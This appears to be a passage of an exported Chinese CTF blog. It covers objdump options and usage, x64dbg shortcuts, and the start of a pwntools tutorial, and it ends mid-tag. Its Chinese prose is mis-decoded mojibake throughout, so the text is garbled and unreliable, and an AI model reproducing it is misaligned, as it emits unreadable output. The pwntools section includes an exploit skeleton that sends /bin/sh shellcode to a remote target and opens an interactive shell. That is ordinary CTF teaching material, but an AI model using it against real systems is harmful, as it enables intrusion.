S-recordsã€‚è¿™ä¸ªé€‰é¡¹åªå½±å“åæ±‡ç¼–</span><br><span class="line">-f, --file-headers</span><br><span class="line">æ˜¾ç¤ºæ¯ä¸€ä¸ªç›®æ ‡æ–‡ä»¶çš„å¤´ä¿¡æ¯</span><br><span class="line">-F, --file-offsets</span><br><span class="line">åæ±‡ç¼–æ—¶ï¼Œæ‰“å°æ¯ä¸€ä¸ªç¬¦å·çš„åç§»åœ°å€</span><br><span class="line">--file-start-context</span><br><span class="line">æ˜¾ç¤ºæºç /æ±‡ç¼–ä»£ç ï¼ˆå‡è®¾ä¸º -Sï¼‰æ—¶ï¼Œå°†ä¸Šä¸‹æ–‡æ‰©å±•åˆ°æ–‡ä»¶çš„å¼€å¤´</span><br><span class="line">-g, --debugging</span><br><span class="line">æ˜¾ç¤ºè°ƒè¯•ä¿¡æ¯ã€‚ä¼å›¾è§£æä¿å­˜åœ¨æ–‡ä»¶ä¸­çš„è°ƒè¯•ä¿¡æ¯å¹¶ä»¥ C è¯­è¨€çš„è¯­æ³•æ˜¾ç¤ºå‡ºæ¥ã€‚ä»…ä»…æ”¯æŒæŸäº›ç±»å‹çš„è°ƒè¯•ä¿¡æ¯ã€‚æœ‰äº›å…¶ä»–çš„æ ¼å¼è¢«readelf -wæ”¯æŒ</span><br><span class="line">-e, --debugging-tags</span><br><span class="line">ç±»ä¼¼ -g é€‰é¡¹ï¼Œä½†æ˜¯ç”Ÿæˆçš„ä¿¡æ¯æ˜¯å’Œctagså·¥å…·ç›¸å…¼å®¹çš„æ ¼å¼</span><br><span class="line">-h, --section-headers, --headers</span><br><span class="line">æ˜¾ç¤ºç›®æ ‡æ–‡ä»¶å„ä¸ª section çš„å¤´éƒ¨æ‘˜è¦ä¿¡æ¯</span><br><span class="line">-i, --info</span><br><span class="line">æ˜¾ç¤ºå¯¹äº -b æˆ–è€… -m é€‰é¡¹å¯ç”¨çš„æ¶æ„å’Œç›®æ ‡æ ¼å¼åˆ—è¡¨</span><br><span class="line">-j, --section=NAME</span><br><span class="line">ä»…æ˜¾ç¤ºæŒ‡å®šåç§°çš„ section çš„ä¿¡æ¯ </span><br><span class="line">-l, --line-numbers</span><br><span class="line">ç”¨æ–‡ä»¶åå’Œè¡Œå·æ ‡æ³¨ç›¸åº”çš„ç›®æ ‡ä»£ç ï¼Œä»…ä»…å’Œ -dã€-D æˆ–è€… -r ä¸€èµ·ä½¿ç”¨</span><br><span class="line">-S,--<span class="built_in">source</span></span><br><span class="line">åæ±‡ç¼–æ—¶å°½å¯èƒ½ä½¿ç”¨æºä»£ç è¡¨ç¤ºã€‚éšå«äº†-då‚æ•°</span><br><span class="line">-m, --architecture=MACHINE</span><br><span class="line">æŒ‡å®šåæ±‡ç¼–ç›®æ ‡æ–‡ä»¶æ—¶ä½¿ç”¨çš„æ¶æ„ï¼Œå½“å¾…åæ±‡ç¼–æ–‡ä»¶æœ¬èº«æ²¡æè¿°æ¶æ„ä¿¡æ¯çš„æ—¶å€™(æ¯”å¦‚S-records)ï¼Œè¿™ä¸ªé€‰é¡¹å¾ˆæœ‰ç”¨ã€‚å¯ä»¥ç”¨-ié€‰é¡¹åˆ—å‡ºè¿™é‡Œèƒ½å¤ŸæŒ‡å®šçš„æ¶æ„</span><br><span class="line">-M, --disassembler-options=OPTIONS</span><br><span class="line">ç»™åæ±‡ç¼–ç¨‹åºä¼ é€’å‚æ•°ï¼Œå¯ä»¥æŒ‡å®šå¤šä¸ªï¼Œä½¿ç”¨é€—å·åˆ†éš”</span><br><span class="line">-p, --private-headers</span><br><span class="line">æ‰“å°ç›®æ ‡æ–‡ä»¶æ ¼å¼çš„ç‰¹å®šä¿¡æ¯ã€‚æ‰“å°çš„ä¿¡æ¯å–å†³äºç›®æ ‡æ–‡ä»¶æ ¼å¼ï¼Œå¯¹äºæŸäº›ç›®æ ‡æ–‡ä»¶æ ¼å¼ï¼Œä¸æ‰“å°ä»»ä½•é™„åŠ ä¿¡æ¯ã€‚</span><br><span class="line">-P, --private=OPTIONS</span><br><span class="line">æ‰“å°ç›®æ ‡æ–‡ä»¶æ ¼å¼çš„ç‰¹å®šä¿¡æ¯ã€‚OPTIONS æ˜¯ä¸€ä¸ªé€—å·åˆ†éš”çš„åˆ—è¡¨ã€‚ä¾‹å¦‚å¯¹äºXCOFFï¼Œå¯ç”¨çš„é€‰é¡¹æœ‰ header, aout, sections, syms, relocs, lineno, loader, except, typchk, traceback and toc</span><br><span class="line">-r, --reloc</span><br><span class="line">æ˜¾ç¤ºæ–‡ä»¶çš„é‡å®šä½å…¥å£ã€‚å¦‚æœå’Œ-dæˆ–è€…-Dä¸€èµ·ä½¿ç”¨ï¼Œé‡å®šä½éƒ¨åˆ†ä»¥åæ±‡ç¼–åçš„æ ¼å¼æ˜¾ç¤ºå‡ºæ¥</span><br><span class="line">-R, --dynamic-reloc</span><br><span class="line">æ˜¾ç¤ºæ–‡ä»¶çš„åŠ¨æ€é‡å®šä½å…¥å£ï¼Œä»…ä»…å¯¹äºåŠ¨æ€ç›®æ ‡æ–‡ä»¶æ„ä¹‰ï¼Œæ¯”å¦‚æŸäº›å…±äº«åº“</span><br><span class="line">-s, --full-contents</span><br><span class="line">æ˜¾ç¤ºsectionçš„å®Œæ•´å†…å®¹ã€‚é»˜è®¤æ‰€æœ‰çš„éç©ºsectionéƒ½ä¼šè¢«æ˜¾ç¤º</span><br><span class="line">-W[lLiaprmfFsoRt],--dwarf=[rawline,=decodedline,=info,=abbrev,=pubnames,=aranges,=macro,=frames,=frames-interp,=str,=loc,=Ranges,=pubtypes,=trace_info,=trace_abbrev,=trace_aranges,=gdb_index]</span><br><span class="line">æ˜¾ç¤ºæ–‡ä»¶ä¸­è°ƒè¯•æ®µçš„å†…å®¹ï¼Œå¦‚æœå­˜åœ¨çš„è¯</span><br><span class="line">-G, --stabs</span><br><span class="line">æ˜¾ç¤ºè¯·æ±‚çš„ä»»ä½• section çš„å…¨éƒ¨å†…å®¹ã€‚æ˜¾ç¤ºæ®µ .stabã€.stab.index å’Œ .stab.excl çš„å†…å®¹</span><br><span class="line">-t, --syms</span><br><span class="line">æ˜¾ç¤ºæ–‡ä»¶çš„ç¬¦å·è¡¨å…¥å£ã€‚ç±»ä¼¼äºnm -sæä¾›çš„ä¿¡æ¯</span><br><span class="line">-T, --dynamic-syms</span><br><span class="line">æ˜¾ç¤ºæ–‡ä»¶çš„åŠ¨æ€ç¬¦å·è¡¨å…¥å£ï¼Œä»…ä»…å¯¹åŠ¨æ€ç›®æ ‡æ–‡ä»¶æ„ä¹‰ï¼Œæ¯”å¦‚æŸäº›å…±äº«åº“ã€‚å®ƒæ˜¾ç¤ºçš„ä¿¡æ¯ç±»ä¼¼äº nm -D,--dynamic æ˜¾ç¤ºçš„ä¿¡æ¯</span><br><span class="line">-x, --all-headers</span><br><span class="line">æ˜¾ç¤ºæ‰€å¯ç”¨çš„å¤´ä¿¡æ¯ï¼ŒåŒ…æ‹¬ç¬¦å·è¡¨ã€é‡å®šä½å…¥å£ã€‚-x ç­‰ä»·äº -a -f -h -p -r -t åŒæ—¶æŒ‡å®š</span><br><span class="line">-w, --wide</span><br><span class="line">ä¸ºå…·æœ‰è¶…è¿‡80åˆ—çš„è¾“å‡ºè®¾å¤‡æ ¼å¼åŒ–æŸäº›è¡Œã€‚ä¹Ÿä¸è¦åœ¨æ˜¾ç¤ºç¬¦å·åç§°æ—¶æˆªæ–­ç¬¦å·åç§°</span><br><span class="line">--start-address=ADDRESS</span><br><span class="line">ä»æŒ‡å®šåœ°å€å¼€å§‹æ˜¾ç¤ºæ•°æ®ï¼Œè¯¥é€‰é¡¹å½±å“ -dã€-r å’Œ -s é€‰é¡¹çš„è¾“å‡º</span><br><span class="line">--stop-address=ADDRESS</span><br><span class="line">æ˜¾ç¤ºæ•°æ®ç›´åˆ°æŒ‡å®šåœ°å€ä¸ºæ­¢ï¼Œè¯¥é¡¹å½±å“-dã€-rå’Œ-sé€‰é¡¹çš„è¾“å‡º</span><br><span class="line">--prefix-addresses</span><br><span class="line">åæ±‡ç¼–çš„æ—¶å€™ï¼Œæ˜¾ç¤ºæ¯ä¸€è¡Œçš„å®Œæ•´åœ°å€ã€‚è¿™æ˜¯ä¸€ç§æ¯”è¾ƒè€çš„åæ±‡ç¼–æ ¼å¼</span><br><span class="line">--no-show-raw-insn</span><br><span class="line">åæ±‡ç¼–æ—¶ï¼Œä¸æ˜¾ç¤ºæ±‡ç¼–æŒ‡ä»¤çš„æœºå™¨ç ã€‚å½“ä½¿ç”¨--prefix-addressesæ—¶ï¼Œè¿™æ˜¯ç¼ºçœé€‰é¡¹</span><br><span class="line">--adjust-vma=OFFSET</span><br><span class="line">å½“è§£æä¿¡æ¯æ—¶ï¼Œé¦–å…ˆç»™æ‰€æœ‰çš„æ®µæ·»åŠ åç§»å€¼offsetã€‚å½“æ®µåœ°å€ä¸ç¬¦å·è¡¨ä¸ç¬¦æ—¶ï¼Œè¿™ä¸ªé€‰é¡¹å¾ˆæœ‰ç”¨ã€‚æ¯”å¦‚å°†æ®µæ”¾ç½®åˆ°ç‰¹æ®Šåœ°å€ï¼Œå› ä¸ºæŸä¸ªæ ¼å¼æ— æ³•è¡¨ç¤ºæ®µåœ°å€ï¼Œæ¯”å¦‚ a.out</span><br><span class="line">--special-syms</span><br><span class="line">æ˜¾ç¤ºç‰¹æ®Šç¬¦å·ä¸ç”¨æˆ·ä¸å…³å¿ƒçš„ç¬¦å·</span><br><span class="line">--prefix=PREFIX</span><br><span class="line">å½“ä½¿ç”¨ -S æ—¶ï¼ŒæŒ‡å®šå‰ç¼€æ·»åŠ åˆ°ç»å¯¹è·¯å¾„ä¸­</span><br><span class="line">--prefix-strip=LEVEL</span><br><span class="line">æŒ‡å®šå‰¥ç¦»ç»å¯¹è·¯å¾„ä¸­å¤šå°‘ä¸ªå‰ç¼€ç›®å½•åã€‚æ­¤é€‰é¡¹åªæœ‰åœ¨ä½¿ç”¨äº†é€‰é¡¹ --prefix=PREFIX æ‰æœ‰æ•ˆ</span><br><span class="line">--insn-width=WIDTH</span><br><span class="line">æŒ‡å®šåæ±‡ç¼–åçš„æŒ‡ä»¤è¾“å‡ºçš„è¡Œå®½ï¼Œå•ä½å­—èŠ‚</span><br><span class="line">-V, --version</span><br><span class="line">ç‰ˆæœ¬ä¿¡æ¯</span><br><span class="line">-H, --<span class="built_in">help</span></span><br><span class="line">å¸®åŠ©ä¿¡æ¯</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="æ“ä½œ"><a href="#æ“ä½œ" class="headerlink" title="æ“ä½œ"></a>æ“ä½œ</h2><h3 id="1-æŸ¥çœ‹Cç¨‹åºçš„æ±‡ç¼–ä»£ç å’Œæºä»£ç "><a href="#1-æŸ¥çœ‹Cç¨‹åºçš„æ±‡ç¼–ä»£ç å’Œæºä»£ç " class="headerlink" title="1.æŸ¥çœ‹Cç¨‹åºçš„æ±‡ç¼–ä»£ç å’Œæºä»£ç "></a>1.æŸ¥çœ‹Cç¨‹åºçš„æ±‡ç¼–ä»£ç å’Œæºä»£ç </h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">gcc -g test.c -o test</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">sub</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> a-b;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">88</span>;</span><br><span class="line">    <span class="type">int</span> b = <span class="number">66</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="type">int</span> sum = add(a, b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a=%d, b=%d, a+b=%d\n&quot;</span>, a, b, sum);</span><br><span class="line"> </span><br><span class="line">    <span class="type">int</span> dif = sub(a, b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a=%d, b=%d, a-b=%d\n&quot;</span>, a, b, dif);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">objdump -D <span class="built_in">test</span> | less <span class="comment">#objdump -Då‘½ä»¤æ¥æŸ¥çœ‹testçš„æ±‡ç¼–ä»£ç ã€‚</span></span><br><span class="line">objdump -S <span class="built_in">test</span> | less <span class="comment">#objdump -Så‘½ä»¤æ¥ä»¥æ±‡ç¼–å’Œæºä»£ç çš„å½¢å¼æŸ¥çœ‹testçš„ä»£ç ã€‚</span></span><br></pre></td></tr></table></figure><h3 id="2-æŸ¥çœ‹å¯æ‰§è¡Œæ–‡ä»¶ä¸­å‡½æ•°è°ƒç”¨çš„åœ°å€"><a href="#2-æŸ¥çœ‹å¯æ‰§è¡Œæ–‡ä»¶ä¸­å‡½æ•°è°ƒç”¨çš„åœ°å€" class="headerlink" title="2.æŸ¥çœ‹å¯æ‰§è¡Œæ–‡ä»¶ä¸­å‡½æ•°è°ƒç”¨çš„åœ°å€"></a>2.æŸ¥çœ‹å¯æ‰§è¡Œæ–‡ä»¶ä¸­å‡½æ•°è°ƒç”¨çš„åœ°å€</h3><p>å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥æŸ¥çœ‹å¯æ‰§è¡Œæ–‡ä»¶ä¸­çš„å‡½æ•°è°ƒç”¨åœ°å€ï¼š<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">objdump -d -j .plt <span class="built_in">test</span></span><br></pre></td></tr></table></figure></p><h3 id="3-æŸ¥çœ‹å…±äº«åº“ä¸­å‡½æ•°çš„åœ°å€"><a href="#3-æŸ¥çœ‹å…±äº«åº“ä¸­å‡½æ•°çš„åœ°å€" class="headerlink" title="3.æŸ¥çœ‹å…±äº«åº“ä¸­å‡½æ•°çš„åœ°å€"></a>3.æŸ¥çœ‹å…±äº«åº“ä¸­å‡½æ•°çš„åœ°å€</h3><p>å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥æŸ¥çœ‹å…±äº«åº“ä¸­å‡½æ•°çš„åœ°å€ï¼š<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">objdump -T /lib/libc.so.6</span><br></pre></td></tr></table></figure></p><h3 id="4-æŸ¥çœ‹å¯æ‰§è¡Œæ–‡ä»¶ä¸­çš„ç¬¦å·è¡¨"><a href="#4-æŸ¥çœ‹å¯æ‰§è¡Œæ–‡ä»¶ä¸­çš„ç¬¦å·è¡¨" class="headerlink" title="4.æŸ¥çœ‹å¯æ‰§è¡Œæ–‡ä»¶ä¸­çš„ç¬¦å·è¡¨"></a>4.æŸ¥çœ‹å¯æ‰§è¡Œæ–‡ä»¶ä¸­çš„ç¬¦å·è¡¨</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">objdump -t <span class="built_in">test</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥åœ¨ç¬¦å·è¡¨ä¸­æ‰¾åˆ°subï¼Œaddçš„åœ°å€<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#objdump -t test</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">test</span>:     file format elf64-x86-64</span><br><span class="line"> </span><br><span class="line">SYMBOL TABLE:</span><br><span class="line">0000000000400238 l    d  .interp        0000000000000000              .interp</span><br><span class="line">0000000000400254 l    d  .note.ABI-tag  0000000000000000              .note.ABI-tag</span><br><span class="line">0000000000400274 l    d  .note.gnu.build-id     0000000000000000              .note.gnu.build-id</span><br><span class="line">0000000000400298 l    d  .gnu.hash      0000000000000000              .gnu.hash</span><br><span class="line">00000000004002b8 l    d  .dynsym        0000000000000000              .dynsym</span><br><span class="line">0000000000400318 l    d  .dynstr        0000000000000000              .dynstr</span><br><span class="line">0000000000400358 l    d  .gnu.version   0000000000000000              .gnu.version</span><br><span class="line">0000000000400360 l    d  .gnu.version_r 0000000000000000              .gnu.version_r</span><br><span class="line">0000000000400380 l    d  .rela.dyn      0000000000000000              .rela.dyn</span><br><span class="line">0000000000400398 l    d  .rela.plt      0000000000000000              .rela.plt</span><br><span class="line">00000000004003c8 l    d  .init  0000000000000000              .init</span><br><span class="line">00000000004003f0 l    d  .plt   0000000000000000              .plt</span><br><span class="line">0000000000400420 l    d  .plt.got       0000000000000000              .plt.got</span><br><span class="line">0000000000400430 l    d  .text  0000000000000000              .text</span><br><span class="line">0000000000400634 l    d  .fini  0000000000000000              .fini</span><br><span class="line">0000000000400640 l    d  .rodata        0000000000000000              .rodata</span><br><span class="line">0000000000400678 l    d  .eh_frame_hdr  0000000000000000              .eh_frame_hdr</span><br><span class="line">00000000004006c0 l    d  .eh_frame      0000000000000000              .eh_frame</span><br><span class="line">0000000000600e10 l    d  .init_array    0000000000000000              .init_array</span><br><span class="line">0000000000600e18 l    d  .fini_array    0000000000000000              .fini_array</span><br><span class="line">0000000000600e20 l    d  .jcr   0000000000000000              .jcr</span><br><span class="line">0000000000600e28 l    d  .dynamic       0000000000000000              .dynamic</span><br><span class="line">0000000000600ff8 l    d  .got   0000000000000000              .got</span><br><span class="line">0000000000601000 l    d  .got.plt       0000000000000000              .got.plt</span><br><span class="line">0000000000601028 l    d  .data  0000000000000000              .data</span><br><span class="line">000000000060102c l    d  .bss   0000000000000000              .bss</span><br><span class="line">0000000000000000 l    d  .comment       0000000000000000              .comment</span><br><span class="line">0000000000000000 l    <span class="built_in">df</span> *ABS*  0000000000000000              crtstuff.c</span><br><span class="line">0000000000600e20 l     O .jcr   0000000000000000              __JCR_LIST__</span><br><span class="line">0000000000400460 l     F .text  0000000000000000              deregister_tm_clones</span><br><span class="line">0000000000400490 l     F .text  0000000000000000              register_tm_clones</span><br><span class="line">00000000004004d0 l     F .text  0000000000000000              __do_global_dtors_aux</span><br><span class="line">000000000060102c l     O .bss   0000000000000001              completed.6355</span><br><span class="line">0000000000600e18 l     O .fini_array    0000000000000000              __do_global_dtors_aux_fini_array_entry</span><br><span class="line">00000000004004f0 l     F .text  0000000000000000              frame_dummy</span><br><span class="line">0000000000600e10 l     O .init_array    0000000000000000              __frame_dummy_init_array_entry</span><br><span class="line">0000000000000000 l    <span class="built_in">df</span> *ABS*  0000000000000000              test.c</span><br><span class="line">0000000000000000 l    <span class="built_in">df</span> *ABS*  0000000000000000              crtstuff.c</span><br><span class="line">00000000004007f0 l     O .eh_frame      0000000000000000              __FRAME_END__</span><br><span class="line">0000000000600e20 l     O .jcr   0000000000000000              __JCR_END__</span><br><span class="line">0000000000000000 l    <span class="built_in">df</span> *ABS*  0000000000000000</span><br><span class="line">0000000000600e18 l       .init_array    0000000000000000              __init_array_end</span><br><span class="line">0000000000600e28 l     O .dynamic       0000000000000000              _DYNAMIC</span><br><span class="line">0000000000600e10 l       .init_array    0000000000000000              __init_array_start</span><br><span class="line">0000000000400678 l       .eh_frame_hdr  0000000000000000              __GNU_EH_FRAME_HDR</span><br><span class="line">0000000000601000 l     O .got.plt       0000000000000000              _GLOBAL_OFFSET_TABLE_</span><br><span class="line">0000000000400630 g     F .text  0000000000000002              __libc_csu_fini</span><br><span class="line">0000000000601028  w      .data  0000000000000000              data_start</span><br><span class="line">000000000040051d g     F .text  0000000000000014              add</span><br><span class="line">000000000060102c g       .data  0000000000000000              _edata</span><br><span class="line">0000000000400634 g     F .fini  0000000000000000              _fini</span><br><span class="line">0000000000000000       F *UND*  0000000000000000              <span class="built_in">printf</span>@@GLIBC_2.2.5</span><br><span class="line">0000000000000000       F *UND*  0000000000000000              __libc_start_main@@GLIBC_2.2.5</span><br><span class="line">0000000000601028 g       .data  0000000000000000              __data_start</span><br><span class="line">0000000000000000  w      *UND*  0000000000000000              __gmon_start__</span><br><span class="line">0000000000400648 g     O .rodata        0000000000000000              .hidden __dso_handle</span><br><span class="line">0000000000400640 g     O .rodata        0000000000000004              _IO_stdin_used</span><br><span class="line">00000000004005c0 g     F .text  0000000000000065              __libc_csu_init</span><br><span class="line">0000000000601030 g       .bss   0000000000000000              _end</span><br><span class="line">0000000000400430 g     F .text  0000000000000000              _start</span><br><span class="line">000000000060102c g       .bss   0000000000000000              __bss_start</span><br><span class="line">0000000000400547 g     F .text  0000000000000070              main</span><br><span class="line">0000000000601030 g     O .data  0000000000000000              .hidden __TMC_END__</span><br><span class="line">0000000000400531 g     F .text  0000000000000016              sub</span><br><span class="line">00000000004003c8 g     F .init  0000000000000000              _init</span><br></pre></td></tr></table></figure></p><h3 id="5-æŸ¥çœ‹-oæ–‡ä»¶çš„ä¿¡æ¯"><a href="#5-æŸ¥çœ‹-oæ–‡ä»¶çš„ä¿¡æ¯" class="headerlink" title="5.æŸ¥çœ‹.oæ–‡ä»¶çš„ä¿¡æ¯"></a>5.æŸ¥çœ‹.oæ–‡ä»¶çš„ä¿¡æ¯</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">objdump -h test.o</span><br></pre></td></tr></table></figure><p>![[Pasted image 20250124143403.png]]<br>æ¥ç€å¯ä»¥ç”¨nmæŸ¥çœ‹å‡½æ•°å’Œå…¨å±€å˜é‡ï¼Œé™æ€å˜é‡<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost <span class="built_in">test</span>]<span class="comment"># nm test.o</span></span><br><span class="line">0000000000000000 T add</span><br><span class="line">000000000000002a T main</span><br><span class="line">                 U <span class="built_in">printf</span></span><br><span class="line">0000000000000014 T sub</span><br></pre></td></tr></table></figure><br>å±€éƒ¨å˜é‡ä¸ä¼šç”Ÿæˆç¬¦å·ï¼Œæœ€ç»ˆæ˜¯åˆ†é…åœ¨æ ˆå†…å­˜ä¸­ï¼Œ<strong>ä¸ä¼šåœ¨å‡½æ•°å¤–éƒ¨è¢«å¼•ç”¨</strong></p>]]></content>
      
      
      <categories>
          
          <category> è§£é¢˜å·¥å…· </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> è§£é¢˜å·¥å…· </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å·¥å…·ç¯‡Â·x64dbg</title>
      <link href="/2025/02/04/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7x64dbg/"/>
      <url>/2025/02/04/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7x64dbg/</url>
      
        <content type="html"><![CDATA[<h2 id="x64dbg"><a href="#x64dbg" class="headerlink" title="x64dbg"></a>x64dbg</h2><ul><li>æœç´¢å­—ç¬¦ä¸²<br><img src="/2025/02/04/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7x64dbg/Pasted image 20250121153435.png" alt="Pasted image 20250121153435"></li><li><code>F7</code>å•æ­¥æ­¥å…¥ï¼ˆè¿›å‡½æ•°ï¼‰</li><li><code>F8</code>å•æ­¥æ­¥è¿‡</li><li>å†…å­˜çª—å£ä¸­è½¬åˆ°åœ°å€<br><img src="/2025/02/04/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7x64dbg/Pasted image 20250121153320.png" alt="Pasted image 20250121153320"></li></ul>]]></content>
      
      
      <categories>
          
          <category> è§£é¢˜å·¥å…· </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> è§£é¢˜å·¥å…· </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å·¥å…·ç¯‡Â·pwntools</title>
      <link href="/2025/02/04/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7pwntools/"/>
      <url>/2025/02/04/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7pwntools/</url>
      
        <content type="html"><![CDATA[<h1 id="å¤§è‡´æ¡†æ¶"><a href="#å¤§è‡´æ¡†æ¶" class="headerlink" title="å¤§è‡´æ¡†æ¶"></a>å¤§è‡´æ¡†æ¶</h1><h3 id="ç®€ä¾‹"><a href="#ç®€ä¾‹" class="headerlink" title="ç®€ä¾‹"></a>ç®€ä¾‹</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#ç®€å•æ ·ä¾‹</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;exploitme.example.com&#x27;</span>, <span class="number">31337</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">###### EXPLOIT CODE IS HERE</span></span><br><span class="line"></span><br><span class="line">r.send(asm(shellcraft.sh()))  </span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="è¯¦è§£"><a href="#è¯¦è§£" class="headerlink" title="è¯¦è§£"></a>è¯¦è§£</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * <span class="comment">#ç”¨æ¥å¯¼å…¥pwntoolsæ¨¡å—</span></span><br><span class="line">----</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>) <span class="comment">#è®¾ç½®ç›®æ ‡æœºçš„ä¿¡æ¯</span></span><br><span class="line">----</span><br><span class="line">r = remote(<span class="string">&#x27;exploitme.example.com&#x27;</span>, <span class="number">31337</span>) <span class="comment">#ç”¨æ¥å»ºç«‹ä¸€ä¸ªè¿œç¨‹è¿æ¥ï¼Œurlæˆ–è€…ipä½œä¸ºåœ°å€ï¼Œç„¶åæŒ‡æ˜ç«¯å£</span></span><br><span class="line">r = process(<span class="string">&quot;./test&quot;</span>) <span class="comment">#è¿™é‡Œä¹Ÿå¯ä»¥ä»…ä»…ä½¿ç”¨æœ¬åœ°æ–‡ä»¶,è°ƒè¯•æ—¶æ–¹ä¾¿ï¼Œtestå³ä¸ºæ–‡ä»¶å,è¿™ä½¿å¾—æ”¹å˜è¿œç¨‹å’Œæœ¬åœ°ååˆ†æ–¹ä¾¿.</span></span><br><span class="line">----</span><br><span class="line">asm(shellcraft.sh()) <span class="comment">#asm()å‡½æ•°æ¥æ”¶ä¸€ä¸ªå­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ï¼Œå¾—åˆ°æ±‡ç¼–ç çš„æœºå™¨ä»£ç ã€‚</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>asm(<span class="string">&#x27;mov eax, 0&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;\xb8\x00\x00\x00\x00&#x27;</span></span><br><span class="line">----</span><br><span class="line">shellcraftæ¨¡å—æ˜¯shellcodeçš„æ¨¡å—ï¼ŒåŒ…å«ä¸€äº›ç”Ÿæˆshellcodeçš„å‡½æ•°ã€‚</span><br><span class="line">å…¶ä¸­çš„å­æ¨¡å—å£°æ˜æ¶æ„ï¼Œæ¯”å¦‚shellcraft.arm æ˜¯ARMæ¶æ„çš„ï¼Œshellcraft.amd64æ˜¯AMD64æ¶æ„ï¼Œshellcraft.i386æ˜¯Intel <span class="number">80386</span>æ¶æ„çš„ï¼Œä»¥åŠæœ‰ä¸€ä¸ªshellcraft.commonæ˜¯æ‰€æœ‰æ¶æ„é€šç”¨çš„ã€‚</span><br><span class="line">è€Œè¿™é‡Œçš„shellcraft.sh()åˆ™æ˜¯æ‰§è¡Œ/<span class="built_in">bin</span>/shçš„shellcodeäº†</span><br><span class="line">----</span><br><span class="line">r.send() <span class="comment">#å°†shellcodeå‘é€åˆ°è¿œç¨‹è¿æ¥</span></span><br><span class="line">----</span><br><span class="line">r.interactive() <span class="comment">#å°†æ§åˆ¶æƒäº¤ç»™ç”¨æˆ·ï¼Œè¿™æ ·å°±å¯ä»¥ä½¿ç”¨æ‰“å¼€çš„shelläº†</span></span><br></pre></td></tr></table></figure><h1 id="Contextè®¾ç½®"><a href="#Contextè®¾ç½®" class="headerlink" title="Contextè®¾ç½®"></a>Contextè®¾ç½®</h1><p><code>context</code>æ˜¯pwntoolsç”¨æ¥è®¾ç½®ç¯å¢ƒçš„åŠŸèƒ½ã€‚åœ¨å¾ˆå¤šæ—¶å€™ï¼Œç”±äºäºŒè¿›åˆ¶æ–‡ä»¶çš„æƒ…å†µä¸åŒï¼Œæˆ‘ä»¬å¯èƒ½éœ€è¦è¿›è¡Œä¸€äº›ç¯å¢ƒè®¾ç½®æ‰èƒ½å¤Ÿæ­£å¸¸è¿è¡Œexpï¼Œæ¯”å¦‚æœ‰ä¸€äº›éœ€è¦è¿›è¡Œæ±‡ç¼–ï¼Œä½†æ˜¯32çš„æ±‡ç¼–å’Œ64çš„æ±‡ç¼–ä¸åŒï¼Œå¦‚æœä¸è®¾ç½®contextä¼šå¯¼è‡´ä¸€äº›é—®é¢˜ã€‚</p><p>ä¸€èˆ¬æ¥è¯´æˆ‘ä»¬è®¾ç½®contextåªéœ€è¦ç®€å•çš„ä¸€å¥è¯:<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span 